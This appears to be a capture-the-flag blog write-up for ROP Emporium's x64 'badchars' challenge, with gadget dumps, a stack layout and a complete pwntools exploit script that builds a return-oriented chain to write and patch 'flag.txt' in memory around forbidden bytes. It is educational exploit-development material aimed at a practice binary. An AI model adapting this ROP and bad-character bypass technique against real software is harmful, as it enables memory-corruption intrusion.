---
layout: page
permalink: /ROP_emporium/ROP-x64-Challenge-5
title: ROP x64 Challenge 5
status: done
type: page
published: true
comments: true
date: 2022-07-13
---
## Challenge 5

Now we have the challenge of dealing with bad chars in our exploit. Not all exploitable programs are so nice to just read in whatever you give it. For example if you are sending a string of text, it may end on a newline, carriage return, or null space. However, you may need these characters to do your dream exploit. 

In order to get around this problem, we have to give the program chars that are accepted then later modify them into what we want. In this exploit, we have to do basically the same thing as the last exploit, however we are unable to pass the characters 'x', 'g', 'a', or '.' and all of those are needed to write in "flag.txt". So what we are going to do is write in some known ("but arbitrary") value's into the location of the bad chars. Then we will use gadgets to modify those values into what we want.

For example, rather then writing 'a' into the binary we write 'b' then we simply subtract 1 from that memory location. 


By this point, I realized that the author of the challenge's had included an 'usefulGadgets' section in the binary (probably should have sooner), so the first thing to do is look over those gadgets and see what we have to work with.

```
pwndbg> disass usefulGadgets 
Dump of assembler code for function usefulGadgets:
   0x0000000000400628 <+0>:     xor    BYTE PTR [r15],r14b
   0x000000000040062b <+3>:     ret    
   0x000000000040062c <+4>:     add    BYTE PTR [r15],r14b
   0x000000000040062f <+7>:     ret    
   0x0000000000400630 <+8>:     sub    BYTE PTR [r15],r14b
   0x0000000000400633 <+11>:    ret    
   0x0000000000400634 <+12>:    mov    QWORD PTR [r13+0x0],r12
   0x0000000000400638 <+16>:    ret    
   0x0000000000400639 <+17>:    nop    DWORD PTR [rax+0x0]
End of assembler dump.
```

We can see that we probably need to control r12, r13, r14, r15, and rdi (first arg) in order to make use of these gadgets, so let's see if we have pop's for those.

```
pwndbg> ropper -- --search "pop r1?"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r1?

[INFO] File: /root/working/badchars/badchars_64/badchars
0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret; 

pwndbg> ropper -- --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: /root/working/badchars/badchars_64/badchars
0x00000000004006a3: pop rdi; ret;
```

We can use the same write location from before to make the challenge as well.

We could use any of the xor, add, or sub modifying gadgets there (also or and and gadgets would work), but I'll use the sub gadget. So what we're going to do is place the ascii char 1 value greater in place of every bad char and then just subtract one from each of those location. So the stack will look like the following:

```
         | stack          |
         | -------------- |
32 bytes | start buffer   |
8  bytes | base pointer   | 
8  bytes | pop_r gadget   | # gadget to get values into r12 through r15
8  bytes | "flag.txt"     | # 1st 8 bytes of the string into r12
8  bytes | write loc      | # place location to write into r13
8  bytes | 1              | # the amount to subtract into r14
8  bytes | write loc + 2  | # the loc of the first char to change 'a' into r15
8  bytes | sub gadget     | # gadget to actually modify memory
8  bytes | pop_r + 3      | # pop only r15 off because the other registers can stay the same
8  bytes | write loc + 3  | # loc of 'g'
8  bytes | sub gadget     |
8  bytes | write loc + 4  | # loc of '.'
8  bytes | sub gadget     |
8  bytes | write loc + 6  | # loc of 'x'
8  bytes | sub gadget     | # now flag.txt should be in memory
8  bytes | pop_rdi gadget | # place location of the sring in rdi for 1st param
8  bytes | write loc      | 
8  bytes | print_file loc | # call function to win
8  bytes | -------------- |

```

When I wrote up this exploit, it worked perfectly until I attempted to modify the '.' character and then some of my payload wasn't getting through. After some debugging, I discovered that the location pointer for write_loc+4 actually contained the hex value of one of the bad chars. So after some experimenting, I ended up shifting the location of my write up 3 bytes which is the write_loc + 3 in my exploit. You'll also see a check for bad chars at the end of the exploit so I don't run into that problem again.


```python 
#!/usr/bin/python3

from pwn import *
# pop r12; pop r13; pop r14; pop r15; ret; 
pop_gaget       = p64(0x40069c)
pop_15  = p64(0x4006a2)

# Move [r13] r12
write_gaget     = p64(0x400634)
pop_rdi         = p64(0x4006a3)
write_loc       = 0x601028 + 3
print_file      = p64(0x400620)
back_junk       = b"B" * 20
# sub    BYTE PTR [r15],r14b
sub_gaget = p64(0x0000000000400630)

# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xc0deba5e)*2

badChars = b"xga."

"""
Place a string (1st arg) into the location
given by the 2nd arg. Note the 2nd arg should be 
packed
"""
import binascii
def print_payload(payload):
        for i in range(0, len(payload), 8):
                continue
            # print(binascii.hexlify(payload[i:i+8]))

def string_place(write_string, write_start):
        returnPayload = b""
        toModify = []
        for i in range(0, len(write_string), 8):
                returnPayload += pop_gaget
                # r12 Value
                temp = write_string[i:i+8]
                # pad in the values so it always fills in all 8 bytes
                temp += b"\x00" * ( 8 - len(temp) )
				
                x = b""
                for j in range(len(temp)):
						
                        #the while loop will keep modifing the value untill it is a good char
                        if temp[j] in badChars:
                                        x += (int(temp[j]) + 1).to_bytes(1, 'big')
											
                                        # this should be the exact memory address of the bad character
                                        toModify.append(write_start + i + j)
                        else:
                                x += temp[j].to_bytes(1, 'big')
                temp = x
                returnPayload += temp
                #destination r13
                returnPayload += p64( write_start+ (i))
                # This is the r14 value
                returnPayload += p64(0x01)
                # This is the r15 value
                returnPayload += p64(0xdeadbeefcafebabe)
                returnPayload += write_gaget
        for i in toModify:
                temp = b""
                temp += pop_15
					
                # This is the r15 value the lopcation to store and subtract from 
                temp += p64(i)
                temp += sub_gaget
                returnPayload += temp
        return returnPayload

"""
Place the value for the first args of a function
"""
def first_arg(var):
        returnPayload = pop_rdi
        returnPayload += p64(var)
        return returnPayload



io = process('./badchars')

#Fill up the buffer and the base pointer
payload = junk + new_bp

payload += string_place(b"./flag.txt", write_loc)

# This is the vaddr of system
# First return to the location of the pop rdi
payload += first_arg(write_loc)
payload += print_file

payload += back_junk


# print("The payload is:")
# print(payload)
print("Payload size is:" + str(len(payload)))

for i in range(len(payload)):
        if payload[i] in badChars:
                print("Warning bad char detected")
                exit()

input("Hit enter to apptempt exploit")

print(io.clean(0.5).decode("utf-8"))
io.send(payload)
input("exploit sent hit enter to end")
print(io.clean(0.5).decode("utf-8"))
sleep(1)
f = open('./payload', 'wb')
f.write(payload)
f.close()

```
